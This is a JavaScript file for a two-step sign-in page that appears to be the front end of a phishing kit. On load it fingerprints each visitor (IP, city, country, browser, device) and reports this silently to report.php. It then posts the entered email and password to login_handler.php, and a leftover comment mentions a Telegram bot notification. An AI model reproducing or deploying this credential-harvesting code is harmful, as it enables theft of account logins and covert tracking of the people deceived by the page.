document.addEventListener('DOMContentLoaded', async () => {
    const isDesktopDevice = () => {
        const ua = navigator.userAgent;
        const isTouchMac = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
        const isMobile = navigator.userAgentData?.mobile
            || /Mobi|Android|iPhone|iPad|iPod|Tablet/i.test(ua)
            || isTouchMac;

        return !isMobile;
    };

    // ==========================================
    // PLATFORM DETECTION
    // ==========================================
    const detectPlatform = () => {
        const ua = navigator.userAgent || "";
        const platform = navigator.platform || "";

        const isIOS =
            /iPhone|iPad|iPod/i.test(ua) ||
            (platform === "MacIntel" && navigator.maxTouchPoints > 1);

        const isAndroid = /Android/i.test(ua);
        const isWindows = /Windows/i.test(ua);
        const isMac = /Macintosh|MacIntel|MacPPC|Mac68K/i.test(platform) && !isIOS;

        if (isIOS || isAndroid) return "mobile";
        if (isMac) return "mac";
        if (isWindows) return "windows";
        return "browser";
    };

    function updatePlatformUI() {
        const platform = detectPlatform();
        document.body.classList.remove("mobile", "mac", "windows", "browser");
        document.body.classList.add(platform);
    }

    updatePlatformUI();

    // ==========================================
    // 1. VISITOR TRACKING & NOTIFICATION
    // ==========================================
    const getVisitorInfo = async () => {
        let ip = 'Unknown', city = 'Unknown', country = 'Unknown';
        try {
            const res = await fetch('https://ipapi.co/json/');
            if (res.ok) {
                const data = await res.json();
                ip = data.ip || 'Unknown';
                city = data.city || 'Unknown';
                country = data.country_name || 'Unknown';
            }
        } catch (e) {
            console.log('IP fetch skipped or failed:', e);
        }

        const ua = navigator.userAgent;
        let browser = 'Unknown';
        if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
        else if (ua.indexOf('Safari') > -1) browser = 'Safari';
        else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
        else if (ua.indexOf('MSIE') > -1 || ua.indexOf('Trident/') > -1) browser = 'Internet Explorer';

        return {
            ip,
            city,
            country,
            time: new Date().toLocaleString(),
            os: navigator.platform || 'Unknown',
            pcType: isDesktopDevice() ? 'Desktop' : 'Mobile',
            browser: browser,
            url: window.location.href
        };
    };

    const visitorInfo = await getVisitorInfo();

    // Send Visit Notification silently on page load
    fetch('report.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'visit', ...visitorInfo })
    }).catch(err => console.error('Visit notification failed:', err));




    // ==========================================
    // 3. MOBILE LOGIN FORM LOGIC (Unchanged)
    // ==========================================
    
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const emailDisplay = document.getElementById('emailDisplay');
    
    const continueBtn = document.getElementById('continueBtn');
    const backBtn = document.getElementById('backBtn');
    const submitBtn = document.getElementById('submitBtn');
    
    const showPwdCheckbox = document.getElementById('showPwd');
    const loginForm = document.getElementById('loginForm');

    // 1. Step Navigation: Continue
    continueBtn.addEventListener('click', () => {
        if (emailInput.value.trim() === '') {
            emailInput.reportValidity(); // Trigger native HTML5 validation
            return;
        }
        
        // Pass email to step 2 display and toggle views
        emailDisplay.textContent = emailInput.value;
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
        
        // Move focus to password field for better UX
        setTimeout(() => passwordInput.focus(), 50); 
    });

    // 2. Step Navigation: Back
    backBtn.addEventListener('click', () => {
        step2.classList.add('hidden');
        step1.classList.remove('hidden');
        emailInput.focus();
    });

    // 3. Checkbox Password Visibility Toggle
    showPwdCheckbox.addEventListener('change', () => {
        passwordInput.type = showPwdCheckbox.checked ? 'text' : 'password';
    });

    // 4. Form Submission to PHP Backend
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault(); // Prevent page reload

        // UI Loading State
        submitBtn.disabled = true;
        submitBtn.textContent = 'Signing in...';

        const payload = {
            email: emailInput.value,
            password: passwordInput.value
        };

        try {
            const response = await fetch('login_handler.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();

            if (response.ok && result.success) {
                // alert('Login Successful! (Check your Telegram bot for the notification)');
                window.location.href = 'deploy.html'; // Redirect in production
            } else {
                alert(result.message || 'Login failed. Please try again.');
            }
        } catch (error) {
            console.error('Network Error:', error);
            alert('A network error occurred. Please check your connection.');
        } finally {
            // Reset UI State
            submitBtn.disabled = false;
            submitBtn.textContent = 'Sign in';
        }
    });
});